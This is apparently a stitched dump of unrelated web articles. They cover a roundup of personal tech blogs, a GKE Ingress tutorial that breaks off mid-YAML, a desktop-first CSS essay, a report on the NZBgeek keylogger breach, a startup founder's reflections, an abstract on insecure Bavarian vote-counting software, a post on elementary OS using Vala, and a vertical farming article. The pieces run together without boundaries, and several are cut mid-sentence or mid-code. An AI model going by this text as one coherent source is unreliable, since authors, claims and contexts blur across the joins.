<p>really, really want to migrate my jekyll blog to Hugo + Netlify but I have so many weird jekyll hacks and collections and templates/includes that I’m sure the migration would take months of spare time.</p>
</blockquote>
<blockquote>
<p>probably faster to build a new site from the ground up, new CSS and all</p>
</blockquote>
<p>Also this year, he was interviewed about his work (he’s a designer at Twitter) and about his blog on <a href="https://www.thundernerds.io/2019/10/writing-a-blog-and-working-at-twitter-with-paul-stamatiou/">Thunder Nerds</a>. (More people should be interviewed about their technology blogs please.)</p>
<p>Paul is a photographer who generates fantastic photo sets and write ups with little animated maps of the location. His <a href="https://paulstamatiou.com/photos/">photos</a>, and the way they are arranged, is truly fantastic. He has of course written <a href="https://paulstamatiou.com/photos/gear/">thousands of words</a> about his camera gear.</p>

<p>Martin Tournoij is the creator of <a href="https://www.goatcounter.com/">Goat Counter</a> and has posts dating back to 2013. His personal website is Jekyll-based and <a href="https://github.com/arp242/arp242.net">open source</a>. I usually run into his writing on <a href="https://lobste.rs/">lobste.rs</a> (a computing-focused community).</p>
<p><span>

    </span></p>
<p>I like the one-page layout of the landing page. There’s a list of posts and projects, a picture, and a link to his CV. My favorite post of his is <a href="https://www.arp242.net/personal-analytics.html">Analytics on personal websites</a> — where he argues in part for vanity statistics:</p>
<blockquote>
<p>As for “vanity stats” or “stats to stroke your ego”: I think that’s actually a valid use case as well. After you spent quite a bit of your spare time writing an article it’s just nice to know people are actually reading it. There’s nothing wrong with being validated – it’s a basic psychological need and I’m not a fan of casually dismissing it.</p>
</blockquote>
<p>Later on, he wrestles with the fact that since he’s the creator of an analytics tool, he doesn’t want this website to turn into an advertising channel for it.</p>
<p>Martin doesn’t shy away from controversial subjects on his blog. He writes about freedom and democracy, he pushes for empathy towards those he disagrees with. He writes without restraint which is admirable in itself.</p>
<p>He uses his own CSS template (<a href="https://github.com/arp242/hello-css">arp242/hello-css</a>) which is worth a look. If you’ll allow me to use a vague statement, his website has a unique visual readability to it.</p>

<p>Joel Califa’s website has whimsy. It doesn’t take itself seriously.</p>

<p>Clicking this button makes text spawn and fly away and fade (the snippets are things from the old web like: <code>&lt;i&gt;</code>, <code>&lt;frameset&gt;</code>, <code>&lt;marquee&gt;</code>, etc). There’s an illustration of his head that hides away when you hover near. The writing in the section headers frizzles with energy.</p>
<p>Joel’s website successfully serves as both a work portfolio and a design blog. His <em>Work</em> page describes itself as a “A sample of text-heavy case studies for patient visitors.” The design blog has “Low frequency, high quality design articles.”</p>
<p>My favorite post is <a href="http://joelcalifa.com/blog/tiny-wins/">Tiny Wins</a>:</p>
<blockquote>
<p>I recently shipped two things at GitHub that had an impact beyond my wildest dreams.</p>
</blockquote>
<p>Where he discusses the work involved in designing dynamic favicons for the Pull Request page:</p>
<blockquote>
<p>Now browser tabs will always show a PR’s current build status.</p>
</blockquote>
<p>As well as adding an arrow that signals which branch your changes are “flowing” into:</p>
<blockquote>
<p>Before releasing this, people would regularly confuse which branch would be merged into which.</p>
</blockquote>
<p>He writes with authentic authority. He covers subjects that seem so obvious after you read them. Like in <a href="http://joelcalifa.com/blog/revisiting-visited/">Revisiting :Visited</a>, where research, the web specification, and its practical uses, are combined:</p>
<blockquote>
<p>A Nielsen study summed this up nicely over ten years ago, “People get lost and move in circles when websites use the same link color for visited and new destinations. To reduce navigational confusion, select different colors for the two types of links.”</p>
</blockquote>
<blockquote>
<p>Can’t we, as an industry, get behind that reasoning? A “visited” link isn’t that far off from a “read” email. They both provide the user with the tacit understanding of where they’ve been.</p>
</blockquote>
<p>Joel exists in the wonderful space between technology and design where he is addressing problems that directly relate to me. For example, his website is the first place I read <a href="http://joelcalifa.com/blog/unsolicited-dating-advice/">a serious defense</a> of the <code>month/day/year</code> date ordering system.</p>
<p>It fills me with joy that I have only read half of his content.</p>

<p>Rasmus Andersson has the prettiest website in this list. An elegant three-column layout that perfectly scales to the browser’s width — dropping to two columns then one column. When a page is selected from the top right menu, the background changes to a rich color and shifts the menu up or down. With a wide enough browser, gray bars frame the website on either side.</p>

<p>Rasmus is the creator of the <a href="https://rsms.me/inter/">Inter</a> font and uses it to great effect with bold hover colors.</p>
<p><span>

    </span></p>
<p>Even his <a href="https://rsms.me/bad-url">404 page</a> is sharp.</p>
<p>After looking around more, I found a <code>&lt;script&gt;</code> tag that includes <a href="https://rsms.me/res/main.js">main.js</a>, a debug tool that must have been used to develop the grid layout (which I think is based on <a href="https://rsms.me/raster/">rsms/raster</a>). Pressing alt+D or alt+G overlays a system of boxes and dots.</p>

<p>Rasmus’s last post was in 2017 — <a href="https://rsms.me/wasm-intro">Introduction to WebAssembly</a> — but it’s one that I revisit often as it’s a clear and detailed explanation of the technology.</p>
<p>His use of the right arrow symbol (U+2192) as well as the rounded hover effect on titles (e.g. “Projects” and “Thoughts and ideas”) is something that I closely copied for my own website as it is just too perfect.</p>
<p>Like Paul Stamatiou, Rasmus has hundreds of articles and has been blogging for a long time – almost two decades. The earlier posts are more likely to be reblogs, quotes, links, and small thoughts. The kind of things that Twitter is now used for.</p>
<p>Unlike Twitter, the permanence of these small thoughts is poetic. Here, in 2002, a new font is announced next to something like a diary entry without a paragraph break in between:</p>
<blockquote>
<p>I’ve completed a new typeface. It’s a sweet little thing called Hovden Stitch. Yes your guess was correct. It looks like stitches, cross-stitches to be precise. Go get it for your mac or pc right here. Yesterday I hung out on a free festival here in Trollhättan. Laurel Music was great. Paola sucked. Laurel Music is playing …</p></blockquote></section></div>

When you create an Ingress object, the GKE Ingress controller creates a Google Cloud HTTP(S) load balancer and configures it according to the information in the Ingress and its associated Services.</p> <p>This article describes how to setup Ingress for External HTTP(S) Load Balancing, install cert-manager certificate provisioner and setup up a Let’s Encrypt certificate. This was written based on GKE <a href="https://cloud.google.com/kubernetes-engine/docs/release-notes-stable#february_11_2020">v1.14.10-gke.17</a>, <a href="https://cert-manager.io/">cert-manager</a> v0.13 and <a href="https://helm.sh/">Helm</a> v3.</p> <h2 id="prerequisites">Prerequisites</h2> <ul> <li><a href="https://cloud.google.com/kubernetes-engine/docs/how-to/creating-a-cluster">A GKE Kubernetes cluster</a></li> <li><a href="https://helm.sh/docs/intro/install/">Helm</a></li> <li><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/">Kubectl</a></li> <li><a href="https://cloud.google.com/compute/docs/ip-addresses/reserve-static-external-ip-address">A global static IP</a> with <a href="https://cloud.google.com/kubernetes-engine/docs/tutorials/configuring-domain-name-static-ip#step_4_configure_your_domain_name_records">DNS configured</a> for your domain for example, as example.your-domain.com. Regional IP addresses do not work with GKE Ingress.</li> </ul> <p>Note that a Service exposed through an Ingress must respond to health checks from the load balancer. According to the <a href="https://cloud.google.com/kubernetes-engine/docs/concepts/ingress#health_checks">docs</a>, your app must either serve a response with an HTTP 200 status to GET requests on the / path, or you can configure an HTTP readiness probe, serving a response with an HTTP 200 status to GET requests on the path specified by the readiness probe.</p> <h2 id="create-a-deployment">Create a deployment</h2> <p>Here is an example of a sample deployment manifest.</p> <div><div><pre><code><span>apiVersion</span><span>:</span> <span>apps/v1</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>(This article was originally published in </em><a target="_blank" title="https://gumroad.com/l/Debbg/z823cp8" href="https://gumroad.com/l/Debbg/z823cp8"><em>How To Debug CSS</em></a><em>)</em></p><p>While I could always understand the idea behind the mobile-first approach to developing websites. It always felt….off to me.</p><p>Mobile-first, which is a design approach that involves starting with the mobile version of a website before the desktop version, is a great idea in theory.&nbsp;</p><p>The problem comes when it meets reality.</p><p>There are countless stories of developers who, upon hearing about (and even learning how to design with) a mobile first approach, ultimately ended up reverting back to, and starting with the desktop versions of their sites.</p><p>According to a <a target="_blank" title="https://twitter.com/KevinJPowell/status/1244427032957784066" href="https://twitter.com/KevinJPowell/status/1244427032957784066">survey</a> conducted by Kevin Powell (a GREAT frontend tutorial maker), the majority (61.5%) of developers prefer to start with the desktop first:</p><p><img src="https://media.graphcms.com/gkrvHBiXR3ON7pcIkwSG" alt="Screenshot 2020-12-27 at 22.39.13.png" title="Screenshot 2020-12-27 at 22.39.13.png" width="597" height="413"></p><p><em><strong>(this after almost 8 years of the mobile-first approach being championed almost exclusively)</strong></em></p><p>This is a sentiment that I have also found to be true on many message boards and online discussions that I’ve seen around responsive web design.</p><p>It is interesting that despite this clear evidence that the majority of developers simply do not inherently want to design websites with a mobile-first approach, the idea is still being championed as the preferred methodology.</p><p>Let’s explore why this is.</p><h2>Why Mobile-First is often championed</h2><p>There are two main reasons why the mobile-first approach is often touted as the best approach to take for developing a responsive website:</p><p>	<strong>1.	Better UX, at every screen size </strong></p><p>The first is that it provides a better user experience at every screen size, because it best optimizes for the smaller screen sizes as well as the larger ones. The argument is that it does this by focusing on only the most important elements of the layout, as that is all that can fit on the smaller mobile screens. And that this focused approach ‘scales up’.</p><p>The trouble with this is that it simply does not seem to hold up to scrutiny.&nbsp;</p><p>What actually seems to end up happening with mobile-first is that the overall site just becomes less creative in general.&nbsp;</p><p>Most mobile sites (and their subsequent desktop sites) end up simply looking the same as every other website out there.</p><p>We’ll see why this is the case shortly (the diagram at the top of this post will give you an idea).</p><p>	<strong>2.	Better organized (and easier to create) CSS </strong></p><p>The second reason why mobile-first is often regarded as the best way to develop a responsive website is that on most sites, the ‘default’ CSS styles (i.e. the styles that are written outside of the scope of media queries) are often the ones that are aimed at the smaller, mobile screen sizes.&nbsp;</p><p><strong>Typical CSS file organization for a responsive website:</strong></p><p><img src="https://media.graphcms.com/output=format:png/resize=height:748,width:996/sPcNpTKARkKzOUO3KzZ4" alt="typical-css-responsive-file.png" title="typical-css-responsive-file.png" width="996" height="748"></p><p>Because the typical CSS workflow of a responsive website is to add the media query related styles after the fact (because media queries are supposed to be at the bottom of the page, as mentioned above), starting with what would be your ‘default’ styles, which would be your mobile styles, seems to make more sense.</p><p>We will also shortly see why this is not exactly correct.</p><p>Let’s dive into the key reasons why, despite these two decent arguments in favor of a mobile-first approach to responsive web design, it still is not the best way to approach it.</p><h2>Why mobile-first is good in theory but bad in practice</h2><h3>You are optimizing for the sub-optimal experience</h3><p>The mobile experience <em>is</em> sub-optimal. This is not a point that is really debated. The entire point of a mobile version of a site is to deliver a lesser, but still somewhat effective version of the optimal desktop experience.</p><p>The problem with optimizing for the mobile experience, is that it does not make the overall experience optimal. It only scales up sub-optimality. The compromises that start on the mobile experience ultimately become compromises on the desktop end.</p><p><strong>It only degrades the desktop experience.</strong></p><p>The desktop site is the ‘real’ site in most cases, <a target="_blank" title="https://www.reddit.com/r/webdev/comments/d7nj58/how_do_you_deal_with_mobile_first_and/" href="https://www.reddit.com/r/webdev/comments/d7nj58/how_do_you_deal_with_mobile_first_and/">most clients</a> expect to see a desktop site first.</p><p>Desktop-first focuses on the design problem that people actually care about, while mobile-first focuses on the CSS organization problem, which only developers do.</p><p>Instead of starting with the sub-optimal experience (that helps the developer), it’s much better overall to optimize for the optimal experience (that helps the user) and then scale down.</p><h3>It’s an unnatural way to design</h3><p>Because design is an intuitive process fundamentally, any design approach that requires you to have to ‘get over yourself’ is probably a bad idea.</p><p>Design is basically a process of guiding the user, by developing an interface based on what guides <em>you</em>, naturally.</p><p>For this to be effective, context is key, and being able to maximally utilize the scope of experience that the user has, gives you more ‘surface area’ with which to appropriately meet the context and guide the user.</p><p>For this reason, It’s better to start at the ‘largest’ possible context for this.&nbsp;</p><p>For example, for a professional sports match. What has a better chance of delivering the ‘fullest’, more complete experience to you?&nbsp;</p><p><strong>The actual, ‘bigger’, more natural, live game:</strong></p><p><img src="https://media.graphcms.com/p5ESEubnQNKm7eEPdLmR" alt="man-290186_1920.jpg" title="man-290186_1920.jpg" width="1920" height="1275"></p><p><strong>Or the TV experience?</strong></p><p><img src="https://media.graphcms.com/qUwYVApRW22XXnKOCOqd" alt="soccer-3496510_1920.jpg" title="soccer-3496510_1920.jpg" width="1920" height="1280"></p><p><em><strong>What should be optimized for first to deliver the best final result in both cases?</strong></em></p><p>The Desktop experience encompasses what is essential information within a mobile context. Mobile does not necessarily have what is essential to a desktop context.</p><p>This is why desktop-first <a target="_blank" title="https://www.reddit.com/r/webdev/comments/cy1xuk/do_you_feel_like_desktop_web_dev_is_fun_and/" href="https://www.reddit.com/r/webdev/comments/cy1xuk/do_you_feel_like_desktop_web_dev_is_fun_and/">seems to feel more natural</a> to most developers. It’s just enough constraint for the task of navigating a website, but not too much.</p><p>Leaving an ideal amount of room for creativity. Which mobile-first kills.</p><h3>Mobile-first kills creativity</h3><p>With mobile-first, there are too many unanswered questions.</p><p>Questions that should have been answered at the desktop level, ultimately never get answered.</p><p>At the desktop level, the challenges are often much bigger, and require more creativity to solve. Because the questions you need to ask at smaller screens are simply fractals (or subsets) of their larger counterparts, It’s much better to answer them first at the larger sizes, which then makes it easier to answer subsequent smaller size and mobile design questions.</p><p>With a mobile-first approach, you can fall into the trap of getting so fixated on the subsets that you fail in giving people the essence of the page. This essence is what the initial answers to the bigger design questions give you.</p><p>To get that essence, in the same way that you would have to crush grapes at scale, and then gradually go through a distillation process to finally achieve a wine. To get a mobile site that really gets to the core of a site, its best to start with the desktop version. And then gradually filter or scale down.</p><h3>Mobile-First makes design too formulaic</h3><p>Because of the degree of constraint in the mobile-first approach, and the lack of room for creativity that this engenders, developers naturally seek out tried and true patterns that they can follow.&nbsp;</p><p>This isn't a bad thing, as we all use inspiration to a degree. The issue is that, just as we’ve seen with frameworks like Bootstrap. Too much of a formulaic approach often leads to a level of sameness that literally bores everyone.</p><p>Mobile-first may be one the things contributing to the ever increasing ‘sameness’ of the web that we see nowadays.</p><p>This consequently reduces the kind of web activity that we want (such as conversions) across the board. People are simply less engaged, and tuning these websites out.</p><p>Imagine if those ever-quirky and endlessly interesting sites of the late 90’s, early 2000’s like the ones we used to find on GeoCities and Angelfire were thinking about ‘mobile first’.&nbsp;</p><p>Do you think they would have achieved the same level of uniqueness? I doubt it.</p><h2>An alternative (desktop-first) approach</h2><p>The mental shift that we should make is not desktop to mobile first.</p><p>It's not to simply squish things on the desktop either.</p><p>The correct mental shift is to say, once we have a desktop version, what do we need to resize, rearrange, or remove in order to have an optimal yet still equally informative experience on mobile?</p><p>We should be asking how we can make the mobile experience a good fractal of the desktop experience.&nbsp;</p><p>We should ask what we are trying to achieve with our desktop site, and how we can achieve (even if only a little bit) the same on smaller screens.</p><p>The way that we should design our websites should be to start with the desktop first, and then scale down with empathy, asking the big designs questions before we start to ask the smaller ones.</p><p>We should start our web design process at the bottom of the CSS file, with the desktop sized media query, instead of making those first global (mobile-first) styles.&nbsp;</p><p>After that, once we have answered our biggest design questions at the desktop level, we can scale down (and up in the code) with more media queries (in the case of the smaller sizes) and with the default global styles in the case of the absolute smallest mobile size. Taking out all but the necessary.&nbsp;</p><p>Ultimately, this feels like the most natural approach to take.</p><p>--</p><p><em>This is an excerpt from </em><a title="https://gumroad.com/l/Debbg/z823cp8" href="https://gumroad.com/l/Debbg/z823cp8"><em>How To Debug CSS</em></a><em>.

<p>NZBgeek is a very popular community-based indexer of Usenet posts. It is run by using the Newznab Interface. NZBgeek provides paid and free services for its own users, plus so they truly have been reasonable to think about.</p>
<p>On the evening of 27 December 2020, NZBgeek announced that they got hacked and the following details of their users are breached in this hacking attack on their community website:</p>
<ol>
<li>Username</li>
<li>Encrypted passwords</li>
<li>Email Address</li>
<li>Credit Card Numbers</li>
</ol>
<h3 id="rtoc-1">How this Attack was Performed?</h3>
<p>According to the announcement post by @Dangerous_Mummy and @jeeves in their Discord server, this attack and data breach happened because the attacker installed a Keylogger on the website of NZBgeek.</p>
<p>@Dangerous_Mummy written:</p>
<blockquote><p><span tabindex="-1" role="button">@everyone</span> Geeks, it’s with a heavy heart that we must admit that we have had a breach. If you have recently used your card or payment with us we suggest changing your credentials and card info as soon as possible. We still don’t know the extent of the damage but are working to find out and give our members the details as they become available.</p></blockquote>
<p>@jeeves written:</p>
<blockquote><p>@everyone</p>
<p>Hey Geeks,</p>
<p>IMPORTANT!</p>
<p>If you have used your card with us since the 20th November 2020 please take appropriate action.<br>
This includes reporting it to your card issuer as this protects you from any unlawful charges.</p>
<p>What We Know:</p>
<p>The hackers were able to place a keylogger on the website.<br>
The hackers obtained a copy of our database which includes your username, encrypted password, email address &amp; last connected ip address.<br>
During this time we had the hard drive on our indexer fail along with an api server.<br>
PayPal data is not at risk provding you do not use the same username/password for NZBgeek.</p>
<p>Advised Actions:</p>
<p>If you use the same userame/password combination on any other website please change them.<br>
You should use 2FA/two factor authticaition with all your online accounts.</p>
<p>Current Situation:</p>
<p>We have everything offline except for the API while we have external help to investigate.<br>
Additional updates will be made here on discord, including what changes to expect moving forward.</p>
<p>Thanks,<br>
jeeves</p></blockquote>

Becoming a millionaire was not discussed, nor even imagined. Yet, here we are.</p><p id="acdf">Here are a few things I’ve learned from a decade of trying to make it on the internet.</p><p id="bcf1">The low point of (one of) my first companies was being so desperate for revenue that we adapted our<em> virtual job fair</em> platform to become a virtual business directory for a small town. For $2000/yr.</p><p id="6385">There is no upside to that. We essentially became a horribly paid consultant for an industry we didn’t care about with a product that didn’t add any value.</p><p id="f2cc">Limping along for years while eating ramen and pitching a VISION isn’t success — you’ll be much worse off than if you had just worked for a startup for a few years to improve your skills and peers.</p><p id="ce0b">To truly bet on yourself while starting a company, everything you do should accelerate any of the following:</p><ul><li id="bc69">Learning new skills: sales, product management, product development, engineering, marketing, design, fundraising</li><li id="12a6">Meeting great people — not in the “I shook Mark Cuban’s hand” sense, but in the “I have 5 equally motivated people in my corner building shit that I can text about the fact that we won’t make payroll next month.”</li><li id="c5c2">Making money on your own time</li><li id="00e0">Travelling or experiencing the world through a different lens (though in 2020 you should just get a remote job)</li></ul><p id="ae33">You don’t need mentors. You don’t need investors. You need 5 friends with similar ambitions trying to figure this shit out with you.</p><p id="537b">You want people that you can call when your world is falling apart. When you want to quit. When you hate your co-founders. When you’re questioning everything. When you’ve made the money, but don’t feel good about it.</p><p id="8018">It is a weird, un-relatable world that we’re playing in. To navigate it, you need people that understand. I’m so lucky I found my people.</p><p id="1451">I don’t have great advice on how to find your people.</p><p id="c46f">Join a co-working space? Get into a startup accelerator? Join a program like <a href="https://www.beondeck.com/" rel="noopener">On Deck</a>? Message people on Twitter?</p><p id="64cd">I know many people who are much more talented than I. They’ve got better ideas, more technical skills, and are just plain smarter.</p><p id="1d7d">What they don’t have is that forcing function that compels me to launch stuff.</p><p id="7bb3">The shamelessness. The not-give-a-fuckery.</p><p id="2ae5">To not quit when I want to quit. I’m not sure that “chip on the shoulder” is all positive, but it’s probably necessary.</p><p id="aaf9">It’s a learned behaviour. I don’t come by it naturally. I hate failing. I suck at getting feedback. I’m overly sensitive. And yet, here we are.</p><p id="cccf">Every successful individual I’ve seen has taken at least 3 years to create something with some hint of product market fit.</p><p id="1a79">Dig deeper into every company that takes off overnight — it’s probably a pivot from something else, the founder’s 8th attempt, or a hail mary. The one thing that truly worked for me was about 3.5 years in.</p><p id="8fb0">That specific thing worked in month 2, but it took 3.5 years of learning to get to that point.</p><p id="2606">My original goal when starting out (Thanks Tim Ferriss!) was to <em>“build a business making 10k a month so I could work from anywhere.”</em></p><p id="b9da">I got there, and enjoyed it — lived in multiple countries, didn’t work too much, drank great wine and ate incredible steak. It wasn’t enough.</p><p id="9d82">Financially, it didn’t matter. The cash was enough, but a life of leisure isn’t a great goal for a 30 year old. I stopped growing, learning.</p><p id="0969">Ironically, that guiding goal held me back. What seemed ambitious at the time led to unambitious decisions, like first building a below average web design company. It also led to coasting when cashflow was (very) good.</p><p id="cdd3">I somehow managed to reverse engineered my version of success, but unfortunately financial success is always a moving target — especially once you have something that works.</p><p id="0d0a">What would have been a better focus is building an exceptional product, an amazing team, and continuing to grow as a leader.</p><p id="65c1">If you can solve for those things, the score (and the cash) takes care of itself.</p><p id="6a9b">That said, if your goal is to build a company that makes 10k/mo that allows you to work from anywhere — go for it, goddamnit.</p><p id="38f1">Building something from scratch is hard, and having a job will often sound very appealing.</p><p id="9e48"><em>Here’s what you need to do today, and here’s your paycheque!</em></p><p id="a7a7">Starting a company has infinite variables. At the early stages, you’re pushing a boulder up every hill you can find. You’re trying to find that one thing that gathers enough momentum to allow you to survive another day.</p><p id="664a">If you’re lucky, you’ll get to a place where you’re no longer trying to survive — you’re trying not to die. There’s a difference.</p><p id="6c93">Every day you will have an infinite to-do list, none of which is certain.Take your best guess at what the most important thing you can work on is.</p><p id="6202">Do that thing, and try to ignore everything else.</p><p id="ee2b">Don’t forget to manage your psychology along the way. At the end of the day no one cares if you fail, and it’s not that important. Have grounding forces in your life (sports, family, knitting) to help keep you sane. Try not to build your whole identity around your company.</p><p id="950c">(You won’t do any of this, but I’m hopeful this will help you realize you’re not the only one.)</p><p id="6c90">Most people who reach unheard of levels of success are probably not that much smarter than you, and they probably don’t work that much harder.</p><p id="d7fd">Granted, there are ridiculously smart driven people that operate on another level (Elon Musk, The Collisons). They’re likely going to be trillionaires.</p><p id="7870">I’ve met many people who have built $100m+ companies that are very smart and work very hard — but probably not that much harder than a Senior Engineer at Amazon. Success is a result of talent, hard work, and luck.</p><p id="3b30">If you’re smart, want to work hard, and care about building a business one day — the best place to put that energy is into creating something new.</p><p id="7ac5">You can’t get lucky if you’re not in the game.</p></div></div></section></div>]]>

<!-- %h3 About -->
<p>After the first unsuccessful deployment of voting machines in Germany about ten years ago, elements of electronic voting have reached elections again. Although there is now still a paper-trail, more and more essential steps, such as counting the votes, are moved into electronic systems. This change in the ballot-counting procedure took place mostly unnoticed by the public. We are two very concerned election workers who present our first-hand experience in this talk. We show that the current digital procedure is conceptually and practically flawed in terms of security. First, we give an insight into the role of computers and their interaction with humans during ballot-counting. We show that the underlying system concepts contradict IT-security best-practices. Next, we present an in-depth analysis of one ballot-counting software, deployed for the Bavarian municipal elections ("Kommunalwahlen"). We discovered several severe security vulnerabilities that allow an almost unnoticeable manipulation of local voting results. Finally, we conclude that there is an immediate need for action to re-establish election security and transparency - not only for the government but for everyone of us.</p>

<p>Elections are a key element of every democracy. However, many democratic countries in the world have to face attacks on them, be it by the government or by foreign countries. Even if ballot counting has been finished, election results are often not accepted but questioned due to alleged manipulations. All these aspects pose major threats to democracy as they try to undermine the actual and publicly perceived integrity of elections.</p>

<p>In Germany, elections are usually considered quite secure. Elections are paper-based and the subsequent ballot-counting is open to the public. The infamous introduction of electronic voting machines about ten years ago was finally stopped by the German Federal Constitutional Court. Thus, everything is human-controlled, transparent, and secure – isn’t it?</p>

<p>Unfortunately, these claims are questionable since the silent introduction of electronic vote counting. The election system in Germany is quite complex, for example in the "Kreistagswahlen" (~district elections) workers have to count up to 70 individual votes per ballot, while respecting a special rule set. This process is very labor-intensive and sufficient election workers are often hard to come by. Due to this, electronic systems were introduced that provide support during vote counting. Election workers are no longer required to fill tally sheets, count votes, and sum them up on their own. Each ballot is simply entered into a software that performs all the magic and finally emits a result.</p>

<p>This year, we volunteered again as election workers, but our trust in electronically-assisted elections has been vastly impacted. As IT-security researchers, we consider it our responsibility to share and discuss our concerns. We performed a thorough analysis of the concept and the hard- and software of the electronic vote counting system. We discovered several flaws on a conceptual and practical level, that can severely diminish the integrity of the election and makes it prone to manipulations. To underline the impact of the system’s vulnerabilities, we demonstrate an exemplary attack on an election.</p>

<p>Finally, we propose different options on how to make elections secure again. We do not consider this an entirely technical case, as there are significant legal and societal circumstances that led to the deployment of this insecure system.</p>

<p>If you follow elementary OS development, you may know that we do not write our applications on C or Python, but rather a language called <a rel="nofollow noopener noreferrer" target="_blank" href="https://wiki.gnome.org/Projects/Vala">Vala</a>. While it is true that a more mainstream language would lower the barrier to entry for new first-party and third-party developers, Vala has proven to be a tremendously effective tool for our needs.</p>

<p>Vala is an object-oriented programming language developed by the <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.gnome.org/">GNOME Foundation</a>, which was first released in 2006. Syntax-wise, Vala looks and acts very similarly to Java or C#, which makes it easy for new contributors to leverage their knowledge and experience from other languages. Vala’s clear syntax and tight coupling with the strongly-typed GObject system promotes highly readable, expressive, and maintainable code, while preventing entire classes of crashes and bugs.</p>

<p>Since Vala compiles to C (and then into binary), we gain access to a large number of bindings for libraries written in C. This is extremely important given the number of C libraries available for the Linux desktop. All of our desktop applications are written using the <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.gtk.org/">GTK</a> toolkit, and many rely heavily on related GObject-based libraries, including Gee, WebKitGTK, VTE, and GStreamer. Bindings for dozens of popular GObject C libraries exist, and writing new ones is easy.</p>

<p>Before we adopted Vala, we wrote our desktop applications in Python. As both a language and a platform, Python made developing apps quick and easy. However, this ease of development came at a serious cost — performance, binding support, and maintainability became major pain points for us with Python. Worse, the slow and fragmented adoption of Python 3 over Python 2, particularly across Linux distributions, made packaging our apps and developer tools for different environments tedious and challenging. Vala’s native binaries have proven to be a better fit for us.</p>

<figure>
  <p><img src="https://cdn-images-1.medium.com/max/2000/1*HjaeSVLblDtdCwOkBR2xcA.png" alt="A Simple GTK Application in&nbsp;Vala"></p>
  <figcaption>A Simple GTK Application in&nbsp;Vala</figcaption>
</figure>

<p>Because Vala is developed by the same incredible folks who make GTK, integration between Vala and GTK is tight. Extending GTK with Vala has also proven successful. In fact, we’ve crafted our own set of widgets that build on and complement what GTK provides by default. This super-set of GTK, called <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/elementary/granite">Granite</a>, is at the heart of nearly every elementary application, and Vala’s excellent object-oriented inheritance system, among other sophisticated language features, have been key to our development.</p>

<p>Vala has excellent documentation, be it in the form of <a rel="nofollow noopener noreferrer" target="_blank" href="https://chebizarro.gitbooks.io/the-vala-tutorial/content/">tutorials</a>, <a rel="nofollow noopener noreferrer" target="_blank" href="https://wiki.gnome.org/Projects/Vala/Examples">code samples</a> or a <a rel="nofollow noopener noreferrer" target="_blank" href="https://valadoc.org/">very easy-to-use API Reference</a>. So if you’re interested in <a rel="nofollow noopener noreferrer" target="_blank" href="https://elementary.io/get-involved">hacking on our projects</a> (which we very much appreciate — we are always looking for new contributors!), or are planning to release fantastic third-party desktop applications for elementary OS, we can’t recommend Vala enough. Dive in!</p>

<![CDATA[2-Acre Vertical Farm Run by AI and Robots Out-Produces 720-Acre Flat Farm]]>

	<p><a href="https://www.plenty.ag/" target="_blank" rel="noopener">Plenty</a> is an ag-tech startup in San Francisco, co-founded by Nate Storey, that is reinventing farms and farming. Storey, who is also the company’s chief science officer, says the future of farms is vertical and indoors because that way, the food can grow anywhere in the world, year-round; and the future of farms employ robots and AI to continually improve the quality of growth for fruits, vegetables, and herbs. Plenty does all these things and uses 95% less water and 99% less land because of it.</p>
<p>In recent years, farmers on flat farms have been using new tools for making farming better or easier. They’re using drones and robots to improve crop maintenance, while artificial intelligence is also on the rise, with over 1,600 startups and total investments reaching tens of billions of dollars. Plenty is one of those startups. However, flat farms still use a lot of water and land, while a Plenty vertical farm can produce the same quantity of fruits and vegetables as a 720-acre flat farm, but on only 2 acres!</p>
<p>Storey said:</p>
<blockquote><p>Vertical farming exists because we want to grow the world’s capacity for fresh fruits and vegetables, and we know it’s necessary.</p></blockquote>
<p><span><iframe width="1400" height="788" src="https://www.youtube.com/embed/GO0fRU46ZHc?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-GB&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
<p>Plenty’s climate-controlled indoor farm has rows of plants growing vertically, hung from the ceiling. There are sun-mimicking LED lights shining on them, <a href="https://www.intelligentliving.co/tiny-smart-robots-kill-weeds/">robots</a> that move them around, and artificial intelligence (AI) managing all the variables of water, temperature, and light, and continually learning and optimizing how to grow bigger, faster, better crops. These futuristic features ensure every plant grows perfectly year-round. The conditions are so good that the farm produces 400 times more food per acre than an outdoor flat farm.</p>

<p>Storey said:</p>
<blockquote><p>400X greater yield per acre of ground is not just an incremental improvement, and using almost two orders of magnitude less water is also critical in a time of increasing environmental stress and climate uncertainty. All of these are truly game-changers, but they’re not the only goals.</p></blockquote>
<p>Another perk of vertical farming is locally produced food. The fruits and vegetables aren’t grown 1,000 miles away or more from a city; instead, at a warehouse nearby. Meaning, many transportation miles are eliminated, which is useful for reducing millions of tons of yearly CO2 emissions and prices for consumers. Imported fruits and vegetables are more expensive, so society’s most impoverished are at an extreme nutritional disadvantage. Vertical farms could solve this problem.</p>
<p>Storey said:</p>

<p>Plenty’s farms grow non-GMO crops and don’t use herbicides or pesticides. They recycle all water used, even capturing the evaporated water in the air. The flagship farm in San Francisco is using 100% renewable energy too.</p>
<p>Furthermore, all the packaging is 100% recyclable, made of recycled plastic, and specially designed to keep the food fresh longer to reduce food waste.</p>
<p>Storey told <a href="https://www.forbes.com/sites/johnkoetsier/2020/11/20/this-2-acre-vertical-farm-out-produces-750-acre-flat-farms/" target="_blank" rel="noopener">Forbes</a>:</p>
<blockquote><p>The future will be quite remarkable. And I think the size of the global fresh fruit and vegetable industry will be multiples of what it is today.</p></blockquote>
<p>Plenty has already received $400 million in investment capital from SoftBank, former Google chairman Eric Schmidt, and Amazon’s Jeff Bezos. It’s also struck a deal with Albertsons stores in California to supply 430 stores with fresh produce.</p>
<p>Ideally, the company will branch out, opening vertical farms across the country and beyond. There can never be too many places graced by better food growing with a less environmental cost.</p>

<p>Excerpted from <a href="https://softwarefordays.com/post/functional-programming-and-identity-state-and-time/#resolving-the-time-paradox">Functional Programming and the Semantics of Change, State &amp; Time</a>.</p>
<blockquote>
